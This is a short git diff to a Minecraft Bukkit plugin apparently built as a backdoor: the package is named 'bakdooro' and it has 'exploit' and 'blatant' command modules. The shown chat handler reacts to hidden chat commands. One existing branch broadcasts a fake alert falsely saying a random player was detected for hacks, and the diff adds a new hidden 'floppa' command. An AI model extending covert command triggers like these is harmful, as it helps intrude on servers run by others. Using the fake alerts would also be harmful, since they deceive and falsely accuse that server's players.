@@ -2,6 +2,7 @@ package me.acaiberii.bakdooro.util.handler;
 
 import me.acaiberii.bakdooro.commands.blatant.blnt;
 import me.acaiberii.bakdooro.commands.exploit.exploit;
+import me.acaiberii.bakdooro.commands.misc.misc;
 import org.bukkit.entity.Player;
 import me.acaiberii.bakdooro.items.itm;
 
@@ -121,6 +122,9 @@ public class chathandler {
                 else {
                     if (spl[1].equals("notify")) {
                         blnt.infoBox((getOnlinePlayers().toArray()[new Random().ints(0, getOnlinePlayers().size()).findFirst().getAsInt()]) + " detected for " + itm.hacks[new Random().ints(0, itm.hacks.length).findFirst().getAsInt()], "Player was detected for hacks!");
+                    }
+                    else if (spl[1].equals("floppa")) {
+                        misc.Floppa();
                     }
                 }
             }
